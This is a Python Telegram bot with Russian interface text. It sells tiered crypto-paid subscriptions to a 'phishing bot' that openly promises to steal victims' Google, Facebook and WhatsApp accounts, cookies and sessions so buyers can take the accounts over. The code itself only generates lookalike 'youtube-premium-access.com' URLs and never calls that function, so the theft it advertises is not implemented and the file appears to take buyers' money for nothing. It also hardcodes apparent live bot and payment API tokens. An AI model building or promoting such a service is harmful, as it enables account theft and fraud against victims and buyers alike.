import logging
import aiohttp
import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import datetime
import hashlib

# Определяем директорию где находится код
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# --- НАСТРОЙКИ ---
API_TOKEN = '8514518192:AAFC2lbIxC8l2VgYUZVUA9Eb3izVWLG_-nY'
CRYPTO_PAY_TOKEN = '526811:AAatyx14fjIZ6GitsEvGO2CO72qBnNyHdIS'
ADMIN_ID = 8524326478

# Цены за подписки
SUBSCRIPTION_PRICES = {
    'basic': 500,      # Базовая подписка
    'pro': 1500,       # Pro подписка
    'premium': 5000    # Premium подписка
}

# Ограничения для подписок
SUBSCRIPTION_LIMITS = {
    'basic': {
        'links': 100,           # 100 ссылок
        'lifetime': 30,         # 30 дней
        'link_lifetime': "2-3 дня",  # Время жизни ссылок
        'features': [
            'Ограниченная генерация (100 ссылок)',
            'Стандартная скорость',
            'Базовый анти-детект',
            'Поддержка только YouTube',
            'Хранение данных 7 дней'
        ]
    },
    'pro': {
        'links': 500,           # 500 ссылок
        'lifetime': 90,         # 90 дней
        'link_lifetime': "5-7 дней",  # Время жизни ссылок
        'features': [
            'Улучшенная генерация (500 ссылок)',
            'Высокая скорость',
            'Продвинутый анти-детект',
            'Поддержка YouTube и соцсетей',
            'Хранение данных 30 дней',
            'Приоритетная очередь'
        ]
    },
    'premium': {
        'links': '∞',           # Безлимит
        'lifetime': 365,        # 365 дней
        'link_lifetime': "14-30+ дней",  # Время жизни ссылок
        'features': [
            'Безлимитная генерация ссылок',
            'Максимальная скорость',
            'Элитный анти-детект',
            'Поддержка всех платформ',
            'Вечное хранение данных',
            'Максимальный приоритет',
            'Персональная поддержка',
            'Кастомные домены'
        ]
    }
}

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Хранилище (в памяти)
user_balances = {}  # {user_id: баланс}
user_data_store = {}  # {user_id: данные пользователя}
user_generated_links = {}  # Сгенерированные ссылки пользователей
user_subscriptions = {}  # {user_id: {'type': тип, 'expiry': дата окончания, 'links_used': использовано, 'links_limit': лимит}}
pending_payments = {}  # {user_id: {'subscription_type': тип, 'invoice_id': id}}

# FSM для состояний
class UserStates(StatesGroup):
    waiting_for_youtube_url = State()
    waiting_for_amount = State()

# --- ФУНКЦИИ CRYPTOBOT ---

async def create_crypto_invoice(amount_rub, description):
    """Создает счет в CryptoBot на сумму в рублях"""
    url = "https://pay.crypt.bot/api/createInvoice"
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    payload = {
        "amount": str(amount_rub),
        "fiat": "RUB",
        "currency_type": "fiat",
        "accepted_assets": "USDT,TON,BTC,ETH,LTC,BNB",
        "description": description,
        "allow_comments": False,
        "expires_in": 3600
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data['result']['pay_url'], data['result']['invoice_id']
                else:
                    logging.error(f"Ошибка CryptoBot API: {await resp.text()}")
                    return None, None
    except Exception as e:
        logging.error(f"Ошибка при создании инвойса: {e}")
        return None, None

async def check_crypto_payment(invoice_id):
    """Проверяет статус оплаты счета в CryptoBot"""
    url = f"https://pay.crypt.bot/api/getInvoices"
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    payload = {
        "invoice_ids": invoice_id
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, params=payload) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data['result']['items']:
                        invoice = data['result']['items'][0]
                        return invoice['status'] == 'paid'
                return False
    except Exception as e:
        logging.error(f"Ошибка при проверке оплаты: {e}")
        return False

def generate_phishing_link(youtube_url, user_id):
    """Генерирует фишинг ссылку из YouTube URL"""
    # Проверяем активную подписку
    if user_id not in user_subscriptions:
        return None, "❌ У вас нет активной подписки!"
    
    subscription = user_subscriptions[user_id]
    
    # Проверяем срок действия
    expiry_date = datetime.datetime.strptime(subscription['expiry'], "%Y-%m-%d")
    if datetime.datetime.now() > expiry_date:
        return None, "❌ Ваша подписка истекла!"
    
    # Проверяем лимит ссылок
    if subscription['links_limit'] != '∞' and subscription['links_used'] >= subscription['links_limit']:
        return None, f"❌ Лимит ссылок исчерпан ({subscription['links_used']}/{subscription['links_limit']})!"
    
    # Создаем уникальный ID на основе URL и user_id
    unique_id = hashlib.md5(f"{youtube_url}{user_id}{datetime.datetime.now().timestamp()}".encode()).hexdigest()[:12]
    
    # Генерируем фишинг-ссылку
    phishing_domain = "youtube-premium-access.com"
    phishing_path = f"/watch/v={unique_id}"
    
    phishing_url = f"https://{phishing_domain}{phishing_path}"
    
    # Сохраняем в истории пользователя
    if user_id not in user_generated_links:
        user_generated_links[user_id] = []
    
    user_generated_links[user_id].append({
        'original': youtube_url,
        'phishing': phishing_url,
        'timestamp': datetime.datetime.now().strftime("%d.%m.%Y %H:%M"),
        'clicks': 0,
        'data_captured': []
    })
    
    # Увеличиваем счетчик использованных ссылок
    subscription['links_used'] += 1
    
    return phishing_url, None

# ============================================
# ФУНКЦИИ РАБОТЫ С ФАЙЛАМИ И КАРТИНКАМИ
# ============================================

def get_image_path(filename):
    """Возвращает полный путь к файлу изображения"""
    return os.path.join(BASE_DIR, filename)

def image_exists(filename):
    """Проверяет существование файла изображения"""
    return os.path.exists(get_image_path(filename))

async def send_photo_or_text(chat_id, image_filename, caption, reply_markup=None):
    """
    Универсальная функция отправки фото или текста
    Если фото не найдено, отправляет текстовое сообщение
    """
    try:
        # Проверяем существование файла
        full_path = get_image_path(image_filename)
        logging.info(f"Пытаюсь отправить фото: {full_path}")
        
        if os.path.exists(full_path):
            logging.info(f"Файл найден, размер: {os.path.getsize(full_path)} байт")
            # Используем FSInputFile для создания объекта файла
            photo = FSInputFile(full_path)
            
            return await bot.send_photo(
                chat_id=chat_id,
                photo=photo,
                caption=caption,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        else:
            logging.warning(f"Файл {full_path} не найден")
    except Exception as e:
        logging.error(f"Ошибка при отправке фото {image_filename}: {e}", exc_info=True)
    
    # Если фото не найдено или ошибка, отправляем текстовое сообщение
    logging.info(f"Отправляю текстовое сообщение вместо фото: {image_filename}")
    return await bot.send_message(
        chat_id=chat_id,
        text=caption,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def delete_and_send_photo(chat_id, message_id, photo_path, caption, markup=None):
    """Удаляет старое сообщение и шлет новое с фото"""
    try:
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass
    return await send_photo_or_text(chat_id, photo_path, caption, markup)

# --- КЛАВИАТУРЫ ---

def get_main_keyboard():
    """Основная клавиатура с двумя кнопками"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💎 Купить подписку", callback_data="show_subscriptions")],
            [InlineKeyboardButton(text="💬 Поддержка", url="https://t.me/htttpspubg")]
        ]
    )
    return keyboard

def get_subscriptions_keyboard():
    """Клавиатура выбора подписки"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"🎯 Базовая - {SUBSCRIPTION_PRICES['basic']} ₽", callback_data="subscription_basic")],
            [InlineKeyboardButton(text=f"🚀 Pro - {SUBSCRIPTION_PRICES['pro']} ₽", callback_data="subscription_pro")],
            [InlineKeyboardButton(text=f"🏆 Premium - {SUBSCRIPTION_PRICES['premium']} ₽", callback_data="subscription_premium")],
            [InlineKeyboardButton(text="« Назад", callback_data="back_to_main")]
        ]
    )
    return keyboard

def get_subscription_details_keyboard(subscription_type):
    """Клавиатура с опциями покупки подписки"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"💎 Купить через CryptoBot", callback_data=f"buy_crypto_{subscription_type}")],
            [InlineKeyboardButton(text=f"💳 Купить картой (Админ)", callback_data=f"buy_card_{subscription_type}")],
            [InlineKeyboardButton(text="« Назад к подпискам", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

def get_admin_payment_keyboard(subscription_type):
    """Клавиатура для оплаты через администратора"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👨‍💻 Написать админу", url="https://t.me/htttpspubg")],
            [InlineKeyboardButton(text="« Назад к подпискам", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

def get_invoice_keyboard(subscription_type, invoice_id):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💳 Оплатить в CryptoBot", callback_data=f"open_invoice_{invoice_id}")],
            [InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"check_payment_{invoice_id}")],
            [InlineKeyboardButton(text="« Назад к подпискам", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

async def delete_and_send(chat_id, message_id, text, markup=None):
    """Удаляет старое сообщение и шлет новое"""
    try:
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass
    return await bot.send_message(chat_id, text, reply_markup=markup, parse_mode='HTML')

def get_user_data(user_id):
    """Получает данные пользователя"""
    if user_id not in user_data_store:
        user_data_store[user_id] = {
            'name': f"Пользователь #{user_id % 10000:04d}",
            'id': str(user_id),
            'balance': user_balances.get(user_id, 0),
            'reg_date': datetime.datetime.now().strftime("%d.%m.%Y"),
            'total_spent': 0,
            'purchases_count': 0,
            'total_links': 0
        }
    return user_data_store[user_id]

def get_user_balance(user_id):
    """Получает баланс пользователя"""
    return user_balances.get(user_id, 0)

def get_subscription_info(user_id):
    """Получает информацию о подписке пользователя"""
    if user_id in user_subscriptions:
        subscription = user_subscriptions[user_id]
        expiry_date = datetime.datetime.strptime(subscription['expiry'], "%Y-%m-%d")
        days_left = (expiry_date - datetime.datetime.now()).days
        
        return {
            'type': subscription['type'],
            'expiry': subscription['expiry'],
            'days_left': max(0, days_left),
            'links_used': subscription['links_used'],
            'links_limit': subscription['links_limit']
        }
    return None

def format_bold_text(text):
    """Форматирует весь текст жирным шрифтом"""
    # Удаляем существующие теги <b> и </b>
    text = text.replace('<b>', '').replace('</b>', '')
    # Оборачиваем весь текст в теги <b>
    return f"<b>{text}</b>"

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    welcome_text = format_bold_text("""
🚀 ФИШИНГ БОТ ДЛЯ СКАМА МАМОНТОВ И ЖЕРТВ

🎯 ПРОФЕССИОНАЛЬНЫЙ ИНСТРУМЕНТ ДЛЯ КРАЖИ ДАННЫХ:

⚡ КАК ЭТО РАБОТАЕТ:

1️⃣ Бот создает фишинг ссылку из YouTube URL
2️⃣ Вы отправляете ссылку жертве (мамонту)
3️⃣ Жертва переходит по ссылке
4️⃣ Бот автоматически ворует все данные:

🔐 КРАДУТСЯ ДАННЫЕ:
• Google/Gmail аккаунты
• Facebook профили
• Twitter (X) логины
• WhatsApp данные
• Номера телефонов
• Данные устройства
• Cookies и сессии

💰 ПОСЛЕ ПОЛУЧЕНИЯ ДАННЫХ:
• Входите в аккаунты жертвы
• Меняете пароли
• Получаете полный контроль
• Используете для своих целей

🛡️ ПРЕИМУЩЕСТВА БОТА:
• Полная автоматизация
• Не требует действий от жертвы
• Максимальная скрытность
• Данные в реальном времени
• Работает через любой YouTube URL

💎 ДЛЯ НАЧАЛА РАБОТЫ:
Купите подписку и начните скам мамонтов уже сегодня!
""")
    
    # Отправляем сообщение с картинкой
    await send_photo_or_text(message.chat.id, "photo1.png", welcome_text, get_main_keyboard())

# --- CALLBACK ОБРАБОТЧИКИ ---

@dp.callback_query(lambda callback_query: callback_query.data == 'back_to_main')
async def back_to_main(callback_query: types.CallbackQuery):
    welcome_text = format_bold_text("""
🔗 ФИШИНГ-БОТ PRO VERSION

Создавай рабочие фишинг-ссылки за 2 клика.
Жертва переходит → получаешь все данные:

· Аккаунты (Google, Facebook, WhatsApp)
· Номера телефонов
· Cookies и сессии

💰 Полный контроль над аккаунтами.
🛡️ Полная автоматизация, работа в реальном времени.

💎 Активируй подписку → начинай работу.
""")
    
    # Используем новую функцию для отправки фото
    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                              "photo1.png", welcome_text, get_main_keyboard())
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data == 'show_subscriptions')
async def show_subscriptions(callback_query: types.CallbackQuery):
    text = format_bold_text("""
💎 ВЫБЕРИТЕ ПОДПИСКУ ДЛЯ ФИШИНГА

Доступно 3 уровня подписок для скама мамонтов:

🎯 БАЗОВАЯ - 500 ₽
• 100 фишинг-ссылок
• Срок: 30 дней

🚀 PRO - 1,500 ₽
• 500 фишинг-ссылок
• Срок: 90 дней

🏆 PREMIUM - 5,000 ₽
• Безлимит ссылок
• Срок: 365 дней

👇 Выберите подписку для покупки:
""")
    
    # Используем новую функцию для отправки фото
    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                              "photo3.png", text, get_subscriptions_keyboard())
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('subscription_'))
async def subscription_details(callback_query: types.CallbackQuery):
    subscription_type = callback_query.data.replace('subscription_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        limits = SUBSCRIPTION_LIMITS[subscription_type]
        
        subscription_names = {
            'basic': '🎯 БАЗОВАЯ ПОДПИСКА',
            'pro': '🚀 PRO ПОДПИСКА',
            'premium': '🏆 PREMIUM ПОДПИСКА'
        }
        
        text = format_bold_text(f"""
{subscription_names[subscription_type]}

💰 Цена: {price} ₽
🔗 Лимит ссылок: {limits['links']}
⏱️ Срок действия: {limits['lifetime']} дней
⏳ Время жизни ссылок: {limits['link_lifetime']}

✨ Включенные функции:
""")
        
        for feature in limits['features']:
            text += format_bold_text(f"• {feature}\n")
        
        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                             text, get_subscription_details_keyboard(subscription_type))
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('buy_crypto_'))
async def buy_subscription_crypto(callback_query: types.CallbackQuery):
    subscription_type = callback_query.data.replace('buy_crypto_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        user_id = callback_query.from_user.id
        
        await callback_query.answer("Создаем счет для оплаты...")
        
        description = f"Оплата {subscription_type} подписки Фишинг Бота"
        pay_url, invoice_id = await create_crypto_invoice(price, description)
        
        if pay_url and invoice_id:
            # Сохраняем информацию о платеже
            pending_payments[user_id] = {
                'subscription_type': subscription_type,
                'invoice_id': invoice_id,
                'amount': price,
                'payment_method': 'crypto'
            }
            
            invoice_text = format_bold_text(f"""
✅ СЧЕТ ДЛЯ ОПЛАТЫ СОЗДАН

💰 Сумма: {price} ₽
💎 Подписка: {subscription_type.upper()}
💳 Способ оплаты: CryptoBot
⏱️ Действителен: 60 минут

🔒 Безопасная оплата через CryptoBot:
• USDT (TRC20/ERC20) • TON • BTC
• ETH • LTC • BNB

🎁 После оплаты:
1. Подписка активируется автоматически
2. Вы получите уведомление
3. Сможете создавать фишинг ссылки

📞 При проблемах с оплатой: @htttpspubg
""")
            
            markup = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="💳 Оплатить в CryptoBot", url=pay_url)],
                    [InlineKeyboardButton(text="🔄 Проверить оплату", callback_data=f"check_payment_{invoice_id}")],
                    [InlineKeyboardButton(text="« Назад к подпискам", callback_data="show_subscriptions")]
                ]
            )
            
            # Используем новую функцию для отправки фото
            await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                                      "photo8.png", invoice_text, markup)
            
        else:
            await callback_query.answer("⚠️ Ошибка при создании счета. Попробуйте позже.", show_alert=True)
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('buy_card_'))
async def buy_subscription_card(callback_query: types.CallbackQuery):
    """Обработчик покупки подписки картой через администратора"""
    subscription_type = callback_query.data.replace('buy_card_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        
        card_text = format_bold_text(f"""
💳 Оплата картой

💰 500 ₽ за подписку BASIC

1. Жми кнопку ниже
2. Пиши админу "Хочу подписку"
3. Оплачивай на карту
4. Скидываешь скриншот оплаты
5. Через 5-15 мин у тебя все работает

👨‍💻 Админ: @htttpspubg
""")
        
        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                            card_text, get_admin_payment_keyboard(subscription_type))
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('check_payment_'))
async def check_payment(callback_query: types.CallbackQuery):
    invoice_id = callback_query.data.replace('check_payment_', '')
    user_id = callback_query.from_user.id
    
    # Проверяем, есть ли такой ожидающий платеж
    if user_id in pending_payments and pending_payments[user_id]['invoice_id'] == invoice_id:
        # Проверяем оплату через CryptoBot API
        is_paid = await check_crypto_payment(invoice_id)
        
        if is_paid:
            # Активируем подписку
            subscription_type = pending_payments[user_id]['subscription_type']
            lifetime = SUBSCRIPTION_LIMITS[subscription_type]['lifetime']
            expiry_date = (datetime.datetime.now() + datetime.timedelta(days=lifetime)).strftime("%Y-%m-%d")
            
            # Активируем подписку
            user_subscriptions[user_id] = {
                'type': subscription_type,
                'expiry': expiry_date,
                'links_used': 0,
                'links_limit': SUBSCRIPTION_LIMITS[subscription_type]['links']
            }
            
            # Обновляем данные пользователя
            user_data = get_user_data(user_id)
            user_data['purchases_count'] += 1
            user_data['total_spent'] += SUBSCRIPTION_PRICES[subscription_type]
            
            # Удаляем из ожидающих платежей
            del pending_payments[user_id]
            
            success_text = format_bold_text(f"""
✅ ПОДПИСКА АКТИВИРОВАНА!

💎 Тип подписки: {subscription_type.upper()}
⏱️ Действует до: {expiry_date}
🔗 Лимит ссылок: {SUBSCRIPTION_LIMITS[subscription_type]['links']}
⏳ Время жизни ссылок: {SUBSCRIPTION_LIMITS[subscription_type]['link_lifetime']}

🎉 Теперь вы можете:
1. Создавать фишинг-ссылки для скама мамонтов
2. Отправлять их жертвам
3. Собирать данные автоматически
4. Воровать аккаунты и данные

👇 Начните работу прямо сейчас!
""")
            
            markup = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="💎 Главное меню", callback_data="back_to_main")]
                ]
            )
            
            # Используем новую функцию для отправки фото
            await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                                      "photo1.png", success_text, markup)
            
            await callback_query.answer("✅ Оплата подтверждена! Подписка активирована.", show_alert=True)
        else:
            await callback_query.answer("❌ Оплата не найдена. Пожалуйста, оплатите счет или попробуйте позже.", show_alert=True)
    else:
        await callback_query.answer("❌ Счет не найден или истек. Создайте новый счет.", show_alert=True)

# --- ОБРАБОТЧИК НЕИЗВЕСТНЫХ КОМАНД ---

@dp.message()
async def handle_unknown(message: types.Message):
    unknown_text = format_bold_text("#@$%?&!... Похоже я вас не понял\nПопробуйте воспользоваться меню ниже или введите ❯❯❯ /start")
    await message.answer(unknown_text, parse_mode='HTML')

async def main():
    """Основная функция запуска бота"""
    # Проверяем существование необходимых файлов изображений
    required_images = ['photo1.png', 'photo3.png', 'photo8.png']
    
    logging.info("Проверка наличия файлов изображений...")
    for img in required_images:
        img_path = get_image_path(img)
        if os.path.exists(img_path):
            logging.info(f"✓ Файл {img} найден: {img_path}")
        else:
            logging.warning(f"✗ Файл {img} не найден: {img_path}")
    
    logging.info("Фишинг Бот запущен...")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())